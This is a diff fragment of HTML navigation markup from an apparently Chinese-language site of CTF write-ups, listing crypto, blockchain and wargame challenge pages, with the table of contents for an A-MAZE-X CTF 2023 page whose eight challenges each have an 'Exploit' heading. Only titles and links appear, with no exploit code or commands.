+    <li class="md-nav__item">
+      <a href="../../crypto/bank/" class="md-nav__link">
+        bank
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../crypto/shanghai/" class="md-nav__link">
+        shanghai
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../crypto/easy_rsa/" class="md-nav__link">
+        easy_RSA
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../crypto/normal_rsa/" class="md-nav__link">
+        Normal_RSA
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../crypto/easy_ecc/" class="md-nav__link">
+        easy_ECC
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../crypto/fanfie/" class="md-nav__link">
+        fanfie
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../crypto/jefferson_disk/" class="md-nav__link">
+        转轮机加密
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../crypto/code_modulate/" class="md-nav__link">
+        编码与调制
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../crypto/ciscn_rsa/" class="md-nav__link">
+        CISCN - rsa
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../crypto/opisthocomus_hoazin/" class="md-nav__link">
+        opisthocomus-hoazin
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../crypto/stars_and_shapes/" class="md-nav__link">
+        Stars and Shapes
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../crypto/he_thrusts_his_fists_against_the_post/" class="md-nav__link">
+        He Thrusts His Fists Against the Post
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_6_13" type="checkbox" id="__nav_6_13" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_6_13">
+          PBCTF 2021
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="PBCTF 2021" data-md-level="2">
+        <label class="md-nav__title" for="__nav_6_13">
+          <span class="md-nav__icon md-icon"></span>
+          PBCTF 2021
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../crypto/alkaloid_stream/" class="md-nav__link">
+        Alkaloid Stream
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../crypto/steroid_stream/" class="md-nav__link">
+        Steroid Stream
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../crypto/easyxor/" class="md-nav__link">
+        easyxor
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../crypto/ustc_easy_rsa/" class="md-nav__link">
+        HackerGame - Easy RSA
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../crypto/baby_mac/" class="md-nav__link">
+        Baby MAC
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../crypto/noteasy03/" class="md-nav__link">
+        noteasy03
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../crypto/dealymaffs/" class="md-nav__link">
+        Dealymaffs
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../crypto/weird_programmer/" class="md-nav__link">
+        Weird Programmer
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../crypto/x_factor/" class="md-nav__link">
+        X Factor
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../crypto/paiaiai/" class="md-nav__link">
+        P(ai)^3
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../crypto/casino/" class="md-nav__link">
+        Casino
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../crypto/black_hole/" class="md-nav__link">
+        Black Hole
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../crypto/diophantine/" class="md-nav__link">
+        Diophantine
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_6_25" type="checkbox" id="__nav_6_25" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_6_25">
+          Google CTF 2022
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Google CTF 2022" data-md-level="2">
+        <label class="md-nav__title" for="__nav_6_25">
+          <span class="md-nav__icon md-icon"></span>
+          Google CTF 2022
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../crypto/cycling/" class="md-nav__link">
+        Cycling
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../crypto/maybe_someday/" class="md-nav__link">
+        Maybe Someday
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../crypto/dynamic_rsa/" class="md-nav__link">
+        Dynamic RSA
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_6_27" type="checkbox" id="__nav_6_27" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_6_27">
+          corCTF 2022
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="corCTF 2022" data-md-level="2">
+        <label class="md-nav__title" for="__nav_6_27">
+          <span class="md-nav__icon md-icon"></span>
+          corCTF 2022
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../crypto/exchanged/" class="md-nav__link">
+        exchanged
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../crypto/leapfrog/" class="md-nav__link">
+        leapfrog
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../crypto/shuffle128/" class="md-nav__link">
+        shuffle128
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../crypto/badkey1/" class="md-nav__link">
+        badkey1
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_7" type="checkbox" id="__nav_7" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_7">
+          Blockchain
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Blockchain" data-md-level="1">
+        <label class="md-nav__title" for="__nav_7">
+          <span class="md-nav__icon md-icon"></span>
+          Blockchain
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../blockchain/code_is_law/" class="md-nav__link">
+        Code is Law
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../blockchain/totally_secure_dapp/" class="md-nav__link">
+        Totally Secure Dapp
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../blockchain/cairo_reverse/" class="md-nav__link">
+        Cairo Reverse
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../blockchain/tctf_nft_market/" class="md-nav__link">
+        TCTF NFT Market
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_7_5" type="checkbox" id="__nav_7_5" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_7_5">
+          DownUnderCTF 2022
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="DownUnderCTF 2022" data-md-level="2">
+        <label class="md-nav__title" for="__nav_7_5">
+          <span class="md-nav__icon md-icon"></span>
+          DownUnderCTF 2022
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../blockchain/secret_and_ephemeral/" class="md-nav__link">
+        Secret and Ephemeral
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../blockchain/private_log/" class="md-nav__link">
+        Private Log
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../blockchain/memory_master_on_the_chain/" class="md-nav__link">
+        链上记忆大师
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../blockchain/cookie_market/" class="md-nav__link">
+        Cookie Market
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../blockchain/tetctftoken/" class="md-nav__link">
+        TetCTFToken
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../blockchain/realwrap/" class="md-nav__link">
+        realwrap
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../blockchain/evmvm/" class="md-nav__link">
+        evmvm
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_7_11" type="checkbox" id="__nav_7_11" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_7_11">
+          HackTM CTF 2023
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="HackTM CTF 2023" data-md-level="2">
+        <label class="md-nav__title" for="__nav_7_11">
+          <span class="md-nav__icon md-icon"></span>
+          HackTM CTF 2023
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../blockchain/dragon_slayer/" class="md-nav__link">
+        Dragon Slayer
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../blockchain/diamond_heist/" class="md-nav__link">
+        Diamond Heist
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../blockchain/tealyman/" class="md-nav__link">
+        TealyMan
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../blockchain/sailors_revenge/" class="md-nav__link">
+        Sailor's Revenge
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_7_14" type="checkbox" id="__nav_7_14" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_7_14">
+          SEETF 2023
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="SEETF 2023" data-md-level="2">
+        <label class="md-nav__title" for="__nav_7_14">
+          <span class="md-nav__icon md-icon"></span>
+          SEETF 2023
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../blockchain/murky_seepass/" class="md-nav__link">
+        🎓 Murky SEEPass
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../blockchain/operation_feathered_fortune_fiasco/" class="md-nav__link">
+        Operation Feathered Fortune Fiasco
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../blockchain/pigeon_bank/" class="md-nav__link">
+        Pigeon Bank
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../blockchain/pigeon_vault/" class="md-nav__link">
+        Pigeon Vault
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_7_15" type="checkbox" id="__nav_7_15" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_7_15">
+          CrewCTF 2023
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="CrewCTF 2023" data-md-level="2">
+        <label class="md-nav__title" for="__nav_7_15">
+          <span class="md-nav__icon md-icon"></span>
+          CrewCTF 2023
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../blockchain/positive/" class="md-nav__link">
+        positive
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../blockchain/infinite/" class="md-nav__link">
+        infinite
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../blockchain/deception/" class="md-nav__link">
+        deception
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+    
+  
+  
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_8" type="checkbox" id="__nav_8" checked>
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_8">
+          Wargames
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Wargames" data-md-level="1">
+        <label class="md-nav__title" for="__nav_8">
+          <span class="md-nav__icon md-icon"></span>
+          Wargames
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_8_1" type="checkbox" id="__nav_8_1" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_8_1">
+          OverTheWire
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="OverTheWire" data-md-level="2">
+        <label class="md-nav__title" for="__nav_8_1">
+          <span class="md-nav__icon md-icon"></span>
+          OverTheWire
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../natas/" class="md-nav__link">
+        Natas
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../leviathan/" class="md-nav__link">
+        Leviathan
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../krypton/" class="md-nav__link">
+        Krypton
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../narnia/" class="md-nav__link">
+        Narnia
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_8_2" type="checkbox" id="__nav_8_2" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_8_2">
+          Protostar
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Protostar" data-md-level="2">
+        <label class="md-nav__title" for="__nav_8_2">
+          <span class="md-nav__icon md-icon"></span>
+          Protostar
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../protostar/stack/" class="md-nav__link">
+        Stack
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../protostar/format/" class="md-nav__link">
+        Format
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../protostar/heap/" class="md-nav__link">
+        Heap
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../protostar/net/" class="md-nav__link">
+        Net
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../protostar/final/" class="md-nav__link">
+        Final
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+    
+  
+  
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_8_3" type="checkbox" id="__nav_8_3" checked>
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_8_3">
+          Ethereum
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Ethereum" data-md-level="2">
+        <label class="md-nav__title" for="__nav_8_3">
+          <span class="md-nav__icon md-icon"></span>
+          Ethereum
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ethernaut/" class="md-nav__link">
+        Ethernaut
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../damn_vulnerable_defi/" class="md-nav__link">
+        Damn Vulnerable DeFi V3
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_8_3_3" type="checkbox" id="__nav_8_3_3" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_8_3_3">
+          QuillCTF
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="QuillCTF" data-md-level="3">
+        <label class="md-nav__title" for="__nav_8_3_3">
+          <span class="md-nav__icon md-icon"></span>
+          QuillCTF
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../quillctf/slot_puzzle/" class="md-nav__link">
+        Slot Puzzle
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../quillctf/invest_pool/" class="md-nav__link">
+        Invest Pool
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../quillctf/assert_equal/" class="md-nav__link">
+        assertEqual
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../quillctf/collect/" class="md-nav__link">
+        Collect
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../quillctf/nftbank/" class="md-nav__link">
+        NFTBANK
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../quillctf/license_manager/" class="md-nav__link">
+        LicenseManager
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+    
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          A-MAZE-X CTF 2023
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        A-MAZE-X CTF 2023
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#1-operation-magic-redemption" class="md-nav__link">
+    1. Operation magic redemption 🪄🔮
+  </a>
+  
+    <nav class="md-nav" aria-label="1. Operation magic redemption 🪄🔮">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#exploit" class="md-nav__link">
+    Exploit
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2-mission-modern-weth-rescue-the-ether" class="md-nav__link">
+    2. Mission Modern WETH: Rescue the Ether 🧗🧭
+  </a>
+  
+    <nav class="md-nav" aria-label="2. Mission Modern WETH: Rescue the Ether 🧗🧭">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#exploit_1" class="md-nav__link">
+    Exploit
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-lendex-pool-hack" class="md-nav__link">
+    3. LendEx pool hack 🤺🃏
+  </a>
+  
+    <nav class="md-nav" aria-label="3. LendEx pool hack 🤺🃏">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#exploit_2" class="md-nav__link">
+    Exploit
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#references" class="md-nav__link">
+    References
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#4-operation-rescue-posi-token" class="md-nav__link">
+    4. Operation Rescue POSI Token 💼🔓
+  </a>
+  
+    <nav class="md-nav" aria-label="4. Operation Rescue POSI Token 💼🔓">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#exploit_3" class="md-nav__link">
+    Exploit
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#5-balloon-vault" class="md-nav__link">
+    5. Balloon Vault 🎈🎈
+  </a>
+  
+    <nav class="md-nav" aria-label="5. Balloon Vault 🎈🎈">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#exploit_4" class="md-nav__link">
+    Exploit
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#6-safe-yield" class="md-nav__link">
+    6. Safe Yield? 🏦📈
+  </a>
+  
+    <nav class="md-nav" aria-label="6. Safe Yield? 🏦📈">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#exploit_5" class="md-nav__link">
+    Exploit
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#7-crystal-dao" class="md-nav__link">
+    7. Crystal DAO 💎💎
+  </a>
+  
+    <nav class="md-nav" aria-label="7. Crystal DAO 💎💎">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#exploit_6" class="md-nav__link">
+    Exploit
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#8-liquidatoooor" class="md-nav__link">
+    8. Liquidatoooor 🔱🔱
+  </a>
+  
+    <nav class="md-nav" aria-label="8. Liquidatoooor 🔱🔱">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#exploit_7" class="md-nav__link">
+    Exploit
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_8_4" type="checkbox" id="__nav_8_4" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_8_4">
+          Solana
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Solana" data-md-level="2">
+        <label class="md-nav__title" for="__nav_8_4">
+          <span class="md-nav__icon md-icon"></span>
+          Solana
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../solana_pathway/" class="md-nav__link">
+        Solana Pathway
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../solana_security_workshop/" class="md-nav__link">
+        Solana Security Workshop
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_9" type="checkbox" id="__nav_9" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_9">
+          彩蛋
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="彩蛋" data-md-level="1">
+        <label class="md-nav__title" for="__nav_9">
+          <span class="md-nav__icon md-icon"></span>
+          彩蛋
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../eggs/ctfhub_index/" class="md-nav__link">
+        CTFHub - 首页
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../eggs/ctfhub_wechat/" class="md-nav__link">
+        CTFHub - 公众号
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../eggs/ctfhub_tools/" class="md-nav__link">
+        CTFHub - 工具
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../eggs/ctfhub_match/" class="md-nav__link">
+        CTFHub - 赛事
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../eggs/ctfhub_exams/" class="md-nav__link">
+        CTFHub - 真题
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#1-operation-magic-redemption" class="md-nav__link">
+    1. Operation magic redemption 🪄🔮
+  </a>
+  
+    <nav class="md-nav" aria-label="1. Operation magic redemption 🪄🔮">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#exploit" class="md-nav__link">
+    Exploit
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2-mission-modern-weth-rescue-the-ether" class="md-nav__link">
+    2. Mission Modern WETH: Rescue the Ether 🧗🧭
+  </a>
+  
+    <nav class="md-nav" aria-label="2. Mission Modern WETH: Rescue the Ether 🧗🧭">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#exploit_1" class="md-nav__link">
+    Exploit
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
